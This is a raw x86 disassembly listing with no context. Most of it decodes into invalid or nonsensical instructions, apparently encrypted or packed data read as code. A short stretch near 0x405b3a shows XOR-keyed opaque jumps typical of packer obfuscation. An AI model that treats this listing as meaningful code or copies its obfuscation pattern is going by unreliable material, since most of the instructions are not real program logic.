  405955:	push   0xffffffa9
  405957:	mov    cl,0x26
  405959:	fcomp  QWORD PTR [ecx+0x6c3a024d]
  40595f:	mov    ebp,0x560f8364
  405964:	in     al,0x36
  405966:	aad    0x12
  405968:	(bad)  
  40596a:	mov    bl,0x8f
  40596c:	sbb    eax,0x2d9a27be
  405971:	outs   dx,DWORD PTR ds:[esi]
  405972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405973:	hlt    
  405974:	inc    eax
  405975:	loop   0x4059be
  405977:	cmp    cl,BYTE PTR [eax-0x2]
  40597a:	mov    ch,0x45
  40597c:	pusha  
  40597d:	mov    esi,DWORD PTR [edi+0x62]
  405980:	add    al,0x19
  405983:	pusha  
  405984:	mov    ebp,0xdd75aee
  405989:	sar    DWORD PTR [esi+0x3c],1
  40598c:	push   0x8837d945
  405991:	xchg   esp,eax
  405992:	mov    cl,0x62
  405994:	mov    ecx,0x2bab94a3
  405999:	out    dx,eax
  40599a:	and    dh,BYTE PTR [ebx+0x3bf6e3e5]
  4059a0:	fsub   QWORD PTR [edi+eiz*2]
  4059a3:	or     DWORD PTR [edi+0x41799086],ebp
  4059a9:	into   
  4059aa:	add    al,0x4
  4059ac:	adc    BYTE PTR ds:0x733c10d9,bh
  4059b2:	mov    esp,0x7cca33a8
  4059b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059b8:	je     0x405943
  4059ba:	rcl    DWORD PTR [ebp-0x1618980a],0x73
  4059c1:	imul   esi,DWORD PTR [edi+0x3a453277],0x7d
  4059c8:	pop    ecx
  4059c9:	jge    0x405a2b
  4059cb:	push   esp
  4059cc:	aas    
  4059cd:	cmp    ecx,esi
  4059cf:	frstor [ebx-0x4594f894]
  4059d5:	fadd   DWORD PTR [edx+ecx*4]
  4059d8:	ins    DWORD PTR es:[edi],dx
  4059d9:	mov    DWORD PTR [ebx-0x766884b5],edi
  4059df:	or     bh,bl
  4059e1:	rcr    al,cl
  4059e3:	xchg   ebp,eax
  4059e4:	mov    bl,0x61
  4059e6:	and    al,0x62
  4059e8:	lds    edi,FWORD PTR [esi+ebp*2-0x5e]
  4059ec:	les    edi,FWORD PTR [ecx-0x5b]
  4059ef:	xchg   BYTE PTR [ebp-0xc],bl
  4059f2:	jmp    0x9a7a:0x70db6c19
  4059f9:	(bad)
  4059fc:	cmp    eax,ebp
  4059fe:	lods   eax,DWORD PTR ds:[esi]
  4059ff:	mov    cl,BYTE PTR [edx+0x7]
  405a02:	pop    eax
  405a03:	sub    BYTE PTR [edx+eiz*1],cl
  405a06:	sbb    al,0x3b
  405a08:	or     ebx,DWORD PTR [eax+esi*2]
  405a0b:	(bad)  
  405a0c:	in     al,dx
  405a0d:	test   BYTE PTR [esi-0x423969b7],bl
  405a13:	ret    
  405a14:	mov    dh,0xd
  405a16:	cmp    DWORD PTR [edx+0xe],ebx
  405a19:	xchg   ebx,eax
  405a1a:	out    dx,al
  405a1b:	stos   BYTE PTR es:[edi],al
  405a1c:	or     edx,esi
  405a1e:	repnz sbb DWORD PTR [ecx-0x744e1d86],esp
  405a25:	and    ebp,0x59
  405a28:	jbe    0x4059e6
  405a2a:	out    0xce,eax
  405a2c:	(bad)
  405a2f:	mov    al,ds:0x1e475687
  405a34:	fisttp QWORD PTR [edx]
  405a36:	or     DWORD PTR [ebp-0x5eb4d0e7],0x7d200c93
  405a40:	sub    al,0xc2
  405a42:	push   0x3cbeaa48
  405a47:	pop    ecx
  405a48:	out    0x9,al
  405a4a:	retf   
  405a4b:	shl    BYTE PTR [edi-0x2914865a],1
  405a51:	jnp    0x405a8d
  405a53:	xchg   dh,dh
  405a55:	rol    BYTE PTR ds:0x7b26e304,1
  405a5b:	inc    edi
  405a5c:	jnp    0x405a7a
  405a5e:	and    DWORD PTR [eiz*1+0x5aae11af],esp
  405a65:	ins    BYTE PTR es:[edi],dx
  405a66:	leave  
  405a67:	cli    
  405a68:	outs   dx,DWORD PTR ds:[esi]
  405a69:	mov    esi,0x138605d5
  405a6e:	cmp    eax,0x47b4eb93
  405a73:	inc    ebx
  405a74:	aaa    
  405a75:	push   ebx
  405a76:	add    ebp,ebx
  405a78:	inc    eax
  405a79:	sub    DWORD PTR [edi],esi
  405a7b:	iret   
  405a7c:	lds    edx,FWORD PTR [ecx]
  405a7e:	mov    edx,0xad2719e2
  405a83:	push   0x2
  405a85:	lods   al,BYTE PTR ds:[esi]
  405a86:	ins    DWORD PTR es:[edi],dx
  405a87:	sbb    eax,0x9fe13323
  405a8c:	sbb    al,0x55
  405a8e:	sti    
  405a8f:	daa    
  405a90:	xchg   BYTE PTR [edi+0x4e713402],ch
  405a96:	adc    DWORD PTR [eax+0x58],0xfffffffe
  405a9a:	xor    DWORD PTR [ecx+eiz*8+0x19],ebp
  405a9e:	in     al,0x2a
  405aa0:	repz sbb eax,0xc2bef878
  405aa6:	xor    al,0xea
  405aa8:	or     al,0xcb
  405aaa:	ds jmp 0xd039ca85
  405ab0:	dec    esp
  405ab1:	out    0xc3,al
  405ab3:	sti    
  405ab4:	dec    esi
  405ab5:	ror    DWORD PTR [edi-0x2ddd0e2b],cl
  405abb:	std    
  405abc:	dec    ebp
  405abd:	outs   dx,BYTE PTR ds:[esi]
  405abe:	xor    al,0x4a
  405ac0:	pop    eax
  405ac1:	mov    esp,0x9ca7c982
  405ac6:	and    al,BYTE PTR [eax*4-0x7760bcf9]
  405acd:	sti    
  405ace:	les    edi,FWORD PTR [eax-0x15]
  405ad1:	sub    esi,DWORD PTR [ecx+ebp*1+0x3b]
  405ad5:	sbb    BYTE PTR [ecx+0x385b3658],0xa4
  405adc:	mov    ch,0x34
  405ade:	add    dh,BYTE PTR [ebp-0x5a]
  405ae1:	jb     0x405afe
  405ae3:	popf   
  405ae4:	aaa    
  405ae5:	in     al,dx
  405ae6:	cld    
  405ae7:	pop    ds
  405ae8:	retf   
  405ae9:	(bad)  
  405aea:	fidivr DWORD PTR [eax-0x37564a34]
  405af0:	mov    esp,0xbc23efe3
  405af5:	adc    bh,BYTE PTR [eax]
  405af7:	add    DWORD PTR [eax],esi
  405af9:	or     ah,bl
  405afb:	push   es
  405afc:	sahf   
  405afd:	adc    bl,bl
  405aff:	jo     0x405ad4
  405b01:	cmc    
  405b02:	or     DWORD PTR [ebx],eax
  405b04:	sbb    dh,BYTE PTR [ebp-0x7b]
  405b07:	in     al,dx
  405b08:	xchg   DWORD PTR [edx],esp
  405b0a:	jo     0x405b57
  405b0c:	sub    eax,ecx
  405b0e:	lea    edi,ds:0x237f7556
  405b14:	cmp    DWORD PTR [edi+0x51],0xffffffdc
  405b18:	in     al,0x1b
  405b1a:	pop    esp
  405b1b:	cmp    al,0x58
  405b1d:	outs   dx,DWORD PTR ds:[esi]
  405b1e:	mov    dl,0xf5
  405b20:	push   edi
  405b21:	and    eax,0x2dd85e58
  405b26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b27:	push   ds
  405b28:	adc    eax,0xbda5e891
  405b2d:	adc    dh,BYTE PTR [ecx-0x7643eb8e]
  405b33:	dec    ebp
  405b34:	adc    BYTE PTR [ecx+0xc6d],bh
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43369b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433653,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4336a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4336ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43372f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0xb876da0f
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405b7a
  405be0:	fisubr DWORD PTR [ebp+0x4c0e66ac]
  405be6:	push   esi
  405be7:	and    bl,cl
  405be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bea:	fidiv  DWORD PTR [edi+0x3809ea08]
  405bf0:	mov    eax,0x27950e6f
  405bf5:	or     eax,0xa7d58cb1
  405bfa:	mov    eax,0xbfcb52fd
  405bff:	(bad)
  405c04:	in     al,0xc9
  405c06:	dec    esi
  405c07:	(bad)  
  405c08:	not    DWORD PTR [ebp+0x8]
  405c0b:	rol    DWORD PTR ds:0xe30a3807,0xf4
  405c12:	stos   BYTE PTR es:[edi],al
  405c13:	cmp    eax,DWORD PTR [ebx-0x7]
  405c16:	push   ss
  405c17:	add    BYTE PTR ds:0x178bc957,cl
  405c1d:	test   BYTE PTR [ecx-0x55],0x9c
  405c21:	sahf   
  405c22:	mov    ebx,ss
  405c24:	xchg   ebp,eax
  405c25:	leave  
  405c26:	jmp    0x405c8d
  405c28:	bswap  ebx
  405c2a:	push   0x80d5977d
  405c2f:	jmp    0x219bb91a
  405c34:	je     0x405c7a
  405c36:	pop    ds
  405c37:	dec    esp
  405c38:	sub    eax,0x68d9d782
  405c3d:	ja     0x405bd2
  405c3f:	cwde   
  405c40:	add    ebp,esp
  405c42:	jp     0x405cb1
  405c44:	aas    
  405c45:	mov    dl,0xa8
  405c47:	xchg   esp,eax
  405c48:	adc    eax,0x1799924
  405c4d:	lods   eax,DWORD PTR ds:[esi]
  405c4e:	call   FWORD PTR [esi]
  405c50:	retf   0x5fdb
  405c53:	and    al,0x90
  405c55:	mov    esp,0xbecd09d7
  405c5a:	mov    eax,ds:0x7cbbf7be
  405c5f:	ja     0x405c89
  405c61:	jmp    FWORD PTR [ebx-0x527b6ee2]
  405c67:	push   edx
  405c68:	int3   
  405c69:	sub    ebp,esi
  405c6b:	jp     0x405c3f
  405c6d:	enter  0xe874,0xf4
  405c71:	dec    esp
  405c72:	add    BYTE PTR [esi-0xd966ce9],cl
  405c78:	mov    esp,0xfb32c260
  405c7d:	cmp    DWORD PTR [eax+edx*4],ebx
  405c80:	adc    al,0xe
  405c82:	addr16 mov ebp,0x2170d421
  405c88:	aam    0xd6
  405c8a:	jge    0x405c17
  405c8c:	push   0xffffff96
  405c8e:	rcl    BYTE PTR [ebp-0x47dcad3f],1
  405c94:	and    eax,DWORD PTR [edi-0x51]
  405c97:	cmp    ah,BYTE PTR [ebp+ebx*4+0x29]
  405c9b:	pop    ds
  405c9c:	icebp  
  405c9d:	mov    dl,0xa4
  405c9f:	je     0x405cb1
  405ca1:	adc    ebx,DWORD PTR [edi+0x1f]
  405ca4:	xchg   ebp,eax
  405ca5:	mov    dh,0x9e
  405ca7:	outs   dx,DWORD PTR ds:[esi]
  405ca8:	cs scas al,BYTE PTR es:[edi]
  405caa:	pop    esp
  405cab:	out    0x52,al
  405cad:	call   0x35c94c3a
  405cb2:	jne    0x405d2f
  405cb4:	pop    esi
  405cb5:	and    esi,DWORD PTR [ebx+0x6d]
  405cb8:	retf   0xbb4f
  405cbb:	retf   0x16a8
  405cbe:	mov    al,ds:0x7427826b
  405cc3:	hlt    
  405cc4:	and    al,0xf4
  405cc6:	pop    esi
  405cc7:	in     eax,dx
  405cc8:	cli    
  405cc9:	pop    ss
  405cca:	pop    ecx
  405ccb:	dec    ebx
  405ccc:	int    0x8
  405cce:	push   ecx
  405ccf:	ins    DWORD PTR es:[edi],dx
  405cd0:	sbb    al,0x42
  405cd2:	xchg   esi,eax
  405cd3:	pop    ecx
  405cd4:	jecxz  0x405c93
  405cd6:	cld    
  405cd7:	and    dl,BYTE PTR [edi+0x1b526b43]
  405cdd:	cmp    al,BYTE PTR [esi+edi*4+0x26]
  405ce1:	dec    eax
  405ce2:	bnd jle 0x405c66
  405ce5:	enter  0xcef9,0xea
  405ce9:	adc    BYTE PTR [ebp-0x1dc04dfa],al
  405cef:	push   ecx
  405cf0:	xor    bh,dh
  405cf2:	sbb    dl,BYTE PTR [ebp+0x47]
  405cf5:	scas   al,BYTE PTR es:[edi]
  405cf6:	out    0x5c,eax
  405cf8:	clc    
  405cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cfa:	fstp   QWORD PTR [esi]
  405cfc:	mov    BYTE PTR [ebx],ch
  405cfe:	mov    edx,0xcae3ac44
  405d03:	mov    BYTE PTR [edi-0x2d],bh
  405d06:	jb     0x405d80
  405d08:	lods   eax,DWORD PTR ds:[esi]
  405d09:	sbb    cl,BYTE PTR [esi]
  405d0b:	(bad)  [edi-0x66]
  405d0e:	sub    DWORD PTR [edx],ebp
  405d10:	mov    al,ds:0xb4d511cf
  405d15:	adc    eax,0xbe68f957
  405d1a:	and    esp,DWORD PTR cs:[esi]
  405d1d:	or     eax,0xc28b4ab
  405d22:	mov    edi,0x7b9514ad
  405d27:	ins    DWORD PTR es:[edi],dx
  405d28:	lods   al,BYTE PTR ds:[esi]
  405d29:	in     al,0x56
  405d2b:	add    BYTE PTR [edx-0x11],ch
  405d2e:	cli    
  405d2f:	add    eax,DWORD PTR [edi]
  405d31:	pushf  
  405d32:	loop   0x405d34
  405d34:	aas    
  405d35:	mov    ds:0xf37f9771,eax
  405d3a:	sbb    al,0x2d
  405d3c:	adc    al,0xe8
  405d3e:	in     al,dx
  405d3f:	lea    esi,[ebx+0x6f]
  405d42:	xchg   esi,eax
  405d43:	repz jle 0x405d0e
  405d46:	jl     0x405d37
  405d48:	(bad)  
  405d49:	(bad)  
  405d4a:	popa   
  405d4b:	in     eax,dx
  405d4c:	shl    DWORD PTR [edx-0x32],0x74
  405d50:	jle    0x405d20
  405d52:	and    al,0xaa
  405d54:	lods   eax,DWORD PTR ds:[esi]
  405d55:	sub    BYTE PTR [eax],cl
  405d57:	(bad)  
  405d59:	adc    DWORD PTR [eax+eiz*2+0x79a57734],0x35
  405d61:	xchg   ebx,eax
  405d62:	cld    
  405d63:	jo     0x405de4
  405d65:	fcmovu st,st(5)
  405d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d68:	mov    al,ds:0xbcc6ba85
  405d6d:	lock mov ebx,0xaaa68aab
  405d73:	pop    ebp
  405d74:	or     esp,DWORD PTR [ebp+0x2a]
  405d77:	into   
  405d78:	sbb    esp,edx
  405d7a:	ror    BYTE PTR [edx+0x13a25224],0xf8
  405d81:	jmp    0xfc83b891
  405d86:	sbb    BYTE PTR [esi-0x320014a7],dh
  405d8c:	xor    al,0x40
  405d8e:	sbb    edi,DWORD PTR [ebx+0x23d8e229]
  405d94:	fadd   QWORD PTR [edi+0x30]
  405d97:	pushf  
  405d98:	mov    esi,ecx
  405d9a:	pop    ebp
  405d9b:	lock adc dl,bh
  405d9e:	shr    BYTE PTR [eax],cl
  405da0:	imul   eax,DWORD PTR [eax+0x6338fdf3],0x245c42bd
  405daa:	dec    edi
  405dab:	inc    eax
  405dac:	xchg   esi,eax
  405dad:	mov    ah,al
  405daf:	rol    WORD PTR [edi+ebp*4+0x1402a66d],0x4e
  405db8:	jmp    0x929d37c6
  405dbd:	xchg   edi,eax
  405dbe:	sbb    BYTE PTR [edx],0x8d
  405dc1:	ffreep st(5)
  405dc3:	jmp    0x405e21
  405dc5:	add    al,0x4d
  405dc7:	sbb    BYTE PTR [ecx+ebp*4+0x108c0591],ch
  405dce:	jge    0x405e40
  405dd0:	cmp    eax,0x6d47d018
  405dd5:	(bad)
  405dd9:	sbb    DWORD PTR [edx+0x2a],ecx
  405ddc:	in     al,0x2c
  405dde:	or     eax,esp
  405de0:	pop    ecx
  405de1:	dec    DWORD PTR [ebx-0x10]
  405de4:	pop    ecx
  405de5:	inc    ebx
  405de6:	add    dh,0x32
  405de9:	mov    edx,0x75991710
  405dee:	cmp    al,0x89
  405df0:	mov    ebp,0xef4d9cb2
  405df5:	aam    0x1b
  405df7:	in     al,0x54
  405df9:	mov    ds:0x38f0294b,al
  405dfe:	loopne 0x405df1
  405e00:	stos   DWORD PTR es:[edi],eax
  405e01:	imul   ebx,DWORD PTR [eax-0x50],0xffffffed
  405e05:	push   ebp
  405e06:	in     al,dx
  405e07:	stos   BYTE PTR es:[edi],al
  405e08:	push   edi
  405e09:	cmp    bh,BYTE PTR [edi-0x1b]
  405e0c:	hlt    
  405e0d:	in     al,dx
  405e0e:	xchg   ebp,eax
  405e0f:	dec    edx
  405e10:	sub    al,BYTE PTR [edi]
  405e12:	xor    DWORD PTR [edi+0x4672781e],eax
  405e18:	dec    ebx
  405e19:	jbe    0x405df9
  405e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e1c:	ficom  DWORD PTR [ecx+0x71]
  405e1f:	sub    eax,0x84f3db19
  405e24:	mov    ebx,0x77465aa
  405e29:	(bad)  
  405e2a:	jecxz  0x405e54
  405e2c:	xor    BYTE PTR [esi+0x3],dh
  405e2f:	xchg   ecx,eax
  405e30:	rcr    DWORD PTR [eax],cl
  405e32:	fld    DWORD PTR [ecx+0x2ba2e5fa]
  405e38:	and    ecx,DWORD PTR [esi]
  405e3a:	je     0x405e44
  405e3c:	(bad)  
  405e3d:	mov    ebp,0xa2bdde71
  405e42:	call   0x43bd414e
  405e47:	pop    edi
  405e48:	mov    al,0xbb
  405e4a:	pop    esp
  405e4b:	pop    edi
  405e4c:	fisttp DWORD PTR [ebp+0x31]
  405e4f:	dec    ebx
  405e50:	call   0xdbb1fd2
  405e55:	add    al,0xda
  405e57:	mov    eax,0x216bc114
  405e5c:	jl     0x405e36
  405e5e:	jl     0x405ebe
  405e60:	rcr    BYTE PTR [edi],0x4d
  405e63:	(bad)  
  405e64:	je     0x405e45
  405e66:	mov    gs,WORD PTR [ebp+0x13578d0b]
  405e6c:	pop    es
  405e6d:	leave  
  405e6e:	int3   
  405e6f:	jmp    esi
  405e71:	neg    DWORD PTR [ecx-0x6d]
  405e74:	fmul   QWORD PTR [eax-0x1845782c]
  405e7a:	push   0x1a551de9
  405e7f:	sub    cl,BYTE PTR [esp+0x63]
  405e83:	pop    ecx
  405e84:	mov    ebx,0x1c0ba38d
  405e89:	fnstenv [ebx+0x1ef57f2e]
  405e8f:	inc    ebp
  405e90:	gs fwait
  405e92:	loope  0x405e2a
  405e94:	loop   0x405e6f
  405e96:	push   esp
  405e97:	loop   0x405eef
  405e99:	gs jge 0x405f11
  405e9c:	cmp    eax,0xa86e1646
  405ea1:	sbb    DWORD PTR [esi],0xa14eff4d
  405ea7:	or     al,BYTE PTR [eax+0x47fc34a1]
  405ead:	add    al,0x7b
  405eaf:	lods   al,BYTE PTR ds:[esi]
  405eb0:	fsub   DWORD PTR [eax]
  405eb2:	test   BYTE PTR [ecx-0x51],ch
  405eb5:	popa   
  405eb6:	mov    al,ds:0x4a8dd6a0
  405ebb:	mov    esi,0xd8760b73
  405ec0:	(bad)  
  405ec1:	(bad)  
  405ec2:	mov    eax,ds:0x9f583baa
  405ec7:	mov    bl,0xce
  405ec9:	cwde   
  405eca:	loope  0x405e4f
  405ecc:	lods   eax,DWORD PTR ds:[esi]
  405ecd:	mov    bl,0x16
  405ecf:	mov    eax,ds:0xe4e6a75b
  405ed4:	int    0x6e
  405ed6:	sbb    ah,BYTE PTR [esp+edx*2+0x72]
  405eda:	dec    ecx
  405edb:	jbe    0x405f27
  405edd:	call   0x2f64:0xe13382ff
  405ee4:	fisub  DWORD PTR [edi-0x1b1d711e]
  405eea:	pop    ebp
  405eeb:	not    BYTE PTR [ecx-0x75]
  405eee:	mov    ah,0x86
  405ef0:	inc    edi
  405ef1:	out    dx,al
  405ef2:	and    edx,DWORD PTR [edi+0xa33a433]
  405ef8:	and    eax,0x4869b468
  405efd:	sbb    al,0xb2
  405eff:	cmp    eax,0xcc463053
  405f04:	push   esi
  405f05:	inc    eax
  405f06:	push   ss
  405f07:	and    ah,ch
  405f09:	out    dx,eax
  405f0a:	xor    ebx,DWORD PTR ds:0x7b03e608
  405f10:	int3   
  405f11:	xor    esi,ecx
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ecx-0x598dd2e7],fs
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	lahf   
  405f33:	mov    dh,0xc2
  405f35:	hlt    
  405f36:	inc    edi
  405f37:	loop   0x405f05
  405f39:	sbb    bh,bh
  405f3b:	adc    dh,ch
  405f3d:	xchg   ebp,eax
  405f3e:	repz inc edi
  405f40:	or     ch,BYTE PTR [ecx]
  405f42:	call   0xfa17db81
  405f47:	daa    
  405f48:	jae    0x405f04
  405f4a:	adc    BYTE PTR [ebp-0x1c],dh
  405f4d:	stc    
  405f4e:	jle    0x405f1a
  405f50:	inc    edi
  405f51:	add    DWORD PTR [ebx+0x3],ecx
  405f54:	shl    BYTE PTR [ecx-0x2da09753],0x42
  405f5b:	add    BYTE PTR [edx-0x20],0x4d
  405f5f:	stos   BYTE PTR es:[edi],al
  405f60:	fidivr WORD PTR [ebp-0x33]
  405f63:	mov    ecx,0xbf45f2d9
  405f68:	mov    fs,ebp
  405f6a:	mov    ch,0x4a
  405f6c:	ret    0x395e
  405f6f:	test   eax,0xdee31574
  405f74:	sti    
  405f75:	pop    esi
  405f76:	or     esi,esp
  405f78:	add    ch,dh
  405f7a:	mov    ch,0x6
  405f7c:	icebp  
  405f7d:	(bad)
  405f80:	test   DWORD PTR cs:[esi+0x26],0xa90697ad
  405f88:	inc    ecx
  405f89:	pop    ebx
  405f8a:	ins    DWORD PTR es:[edi],dx
  405f8b:	xchg   edx,eax
  405f8c:	mov    ebp,DWORD PTR [ecx-0x2b0879b3]
  405f92:	xchg   ecx,eax
  405f93:	mov    ebx,0xf0c4724b
  405f98:	cld    
  405f99:	sahf   
  405f9a:	mov    dh,0x2a
  405f9c:	cmp    eax,0x90b0312e
  405fa1:	sub    DWORD PTR [di],esp
  405fa4:	in     al,dx
  405fa5:	lock call 0xca26b5e5
  405fab:	adc    BYTE PTR ds:0x4f866fa2,cl
  405fb1:	adc    al,0xc
  405fb3:	jbe    0x405fb6
  405fb5:	mov    esp,0x22db3ebc
  405fba:	out    dx,eax
  405fbb:	(bad)  
  405fbc:	scas   al,BYTE PTR es:[edi]
  405fbd:	push   esp
  405fbe:	add    dl,BYTE PTR [eax+0x417fc532]
  405fc4:	sub    ecx,DWORD PTR [esi]
  405fc6:	xchg   esp,eax
  405fc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fc8:	sub    al,0x9b
  405fca:	jg     0x405f9a
  405fcc:	cmp    ah,bh
  405fce:	or     DWORD PTR [ebx-0x1e1ad1cc],ecx
  405fd4:	stos   BYTE PTR es:[edi],al
  405fd5:	inc    ecx
  405fd6:	popa   
  405fd7:	clc    
  405fd8:	xchg   ebx,eax
  405fd9:	push   eax
  405fda:	hlt    
  405fdb:	xor    eax,0x40a1f51b
  405fe0:	pop    edi
  405fe1:	je     0x405fa1
  405fe3:	mov    ch,BYTE PTR [eax+0x3b]
  405fe6:	aaa    
  405fe7:	push   0x51
  405fe9:	mov    edx,0x10e61293
  405fee:	sbb    BYTE PTR [ebx+0x7a],dh
  405ff1:	sub    DWORD PTR [ecx-0x78],esp
  405ff4:	xchg   esp,eax
  405ff5:	push   es
  405ff6:	scas   al,BYTE PTR es:[edi]
  405ff7:	jge    0x40605f
  405ff9:	ds dec esp
  405ffb:	rcl    DWORD PTR [esi],cl
  405ffd:	repnz push 0x3b
  406000:	inc    edx
  406001:	ins    DWORD PTR es:[edi],dx
  406002:	scas   eax,DWORD PTR es:[edi]
  406003:	in     al,dx
  406004:	imul   ebx,esi,0x6d2d112
  40600a:	dec    ebp
  40600b:	adc    bh,BYTE PTR [esi-0x53]
  40600e:	add    DWORD PTR [ecx-0x11ff4fac],edi
  406014:	jmp    0x40607e
  406016:	stos   DWORD PTR es:[edi],eax
  406017:	cmp    BYTE PTR [edx],cl
  406019:	adc    eax,0x4b910f1a
  40601e:	inc    eax
  40601f:	mov    bl,0x1d
  406021:	out    0xc,al
  406023:	jmp    0x1c39:0x6b6b99f5
  40602a:	sbb    esp,esp
  40602c:	mov    ch,0x3e
  40602e:	mov    edx,0x8268cdc1
  406033:	push   ds
  406034:	push   ds
  406035:	dec    edx
  406036:	pop    ss
  406037:	push   ebx
  406038:	lods   eax,DWORD PTR ds:[esi]
  406039:	sub    eax,0xce65ce28
  40603e:	out    0x74,eax
  406040:	daa    
  406041:	sbb    ecx,ecx
  406043:	and    bh,bh
  406045:	mov    al,ds:0xf96f6e0f
  40604a:	into   
  40604b:	xchg   esi,eax
  40604c:	mov    edi,DWORD PTR [edi]
  40604e:	mov    dh,0x4f
  406050:	mov    bh,0xbf
  406052:	out    dx,al
  406053:	pop    ebp
  406054:	das    
  406055:	push   edi
  406056:	mov    eax,ds:0xba1c05ba
  40605b:	push   edi
  40605c:	mov    dl,0x45
  40605e:	popf   
  40605f:	lods   eax,DWORD PTR ds:[esi]
  406060:	and    al,0x51
  406062:	jp     0x4060b8
  406064:	cmp    esi,DWORD PTR [ebx-0x68]
  406067:	stos   DWORD PTR es:[edi],eax
  406068:	add    edi,DWORD PTR [eax+0x4fa6b2]
  40606e:	(bad)  
  40606f:	ror    DWORD PTR [edx+0x7a],cl
  406072:	and    dh,bh
  406074:	adc    DWORD PTR [esp+edx*2-0x6c46641c],ebx
  40607b:	jns    0x40602f
  40607d:	mov    eax,DWORD PTR [ecx]
  40607f:	dec    ebx
  406080:	dec    eax
  406081:	xor    eax,DWORD PTR [esi-0x32]
  406084:	ins    DWORD PTR es:[edi],dx
  406085:	dec    eax
  406086:	mov    eax,0xfbe8abf7
  40608b:	jecxz  0x406049
  40608d:	dec    ebx
  40608e:	bound  ebx,QWORD PTR ss:[eax-0x42bff3e2]
  406095:	mov    ah,0x6
  406097:	test   eax,0xfaee6037
  40609c:	or     bh,0xb8
  40609f:	xor    esp,0x3d5357d
  4060a5:	or     eax,0x631efd8c
  4060aa:	ja     0x4060e0
  4060ac:	pop    edx
  4060ad:	(bad)  
  4060ae:	sub    eax,0xc84fb967
  4060b3:	hlt    
  4060b4:	and    eax,0x9a11856a
  4060b9:	push   es
  4060ba:	xlat   BYTE PTR ds:[ebx]
  4060bb:	scas   eax,DWORD PTR es:[edi]
  4060bc:	je     0x40607a
  4060be:	(bad)  
  4060c0:	cld    
  4060c1:	mov    ebp,?
  4060c3:	test   eax,0x89232f98
  4060c8:	or     BYTE PTR [edx],bl
  4060ca:	mov    bh,0x75
  4060cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060cd:	dec    ah
  4060cf:	xor    eax,0x36d8e8f2
  4060d4:	out    dx,al
  4060d5:	mov    edx,DWORD PTR [eax]
  4060d7:	sub    eax,0x6569d755
  4060dc:	popf   
  4060dd:	jg     0x406079
  4060df:	stc    
  4060e0:	dec    edx
  4060e1:	or     ebp,ecx
  4060e3:	mov    dh,0xe5
  4060e5:	outs   dx,BYTE PTR ds:[esi]
  4060e6:	adc    eax,0x1a96cacf
  4060eb:	adc    DWORD PTR [ebx-0x57e4b492],ebx
  4060f1:	push   cs
  4060f2:	adc    eax,0x9d664d47
  4060f7:	out    0x69,al
  4060f9:	push   edx
  4060fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060fb:	sti    
  4060fc:	scas   al,BYTE PTR es:[edi]
  4060fd:	mov    edi,0x12ae8dbb
  406102:	jp     0x4060a0
  406104:	push   ecx
  406105:	and    edx,edi
  406107:	sbb    bl,dh
  406109:	mov    cl,0x73
  40610b:	and    DWORD PTR [esi],esi
  40610d:	inc    edi
  40610e:	sub    edi,DWORD PTR ss:[esi+0x4739b203]
  406115:	inc    ebx
  406116:	fwait
  406117:	stc    
  406118:	ins    DWORD PTR es:[edi],dx
  406119:	call   0xf477:0xae1ad91f
  406120:	push   edi
  406121:	scas   al,BYTE PTR es:[edi]
  406122:	jmp    0x301649f4
  406127:	and    eax,0xc654d9b0
  40612c:	mov    BYTE PTR [esi-0x19],0x23
  406130:	dec    edx
  406131:	call   0xedbd:0x542933df
  406138:	loope  0x406122
  40613a:	stos   DWORD PTR es:[edi],eax
  40613b:	mov    eax,ds:0xdea8b759
  406140:	pop    ss
  406141:	cmc    
  406142:	bswap  edi
  406144:	mov    DWORD PTR [ebx+0x1f],ebx
  406147:	call   0xda0a:0xd420234c
  40614e:	jmp    0x406148
  406150:	imul   edx
  406152:	dec    esi
  406153:	sbb    eax,0x5a6e05bb
  406158:	cld    
  406159:	pop    eax
  40615a:	je     0x4061c4
  40615c:	clc    
  40615d:	xchg   ecx,eax
  40615e:	lods   eax,DWORD PTR ds:[esi]
  40615f:	dec    ecx
  406160:	stos   BYTE PTR es:[edi],al
  406161:	scas   eax,DWORD PTR es:[edi]
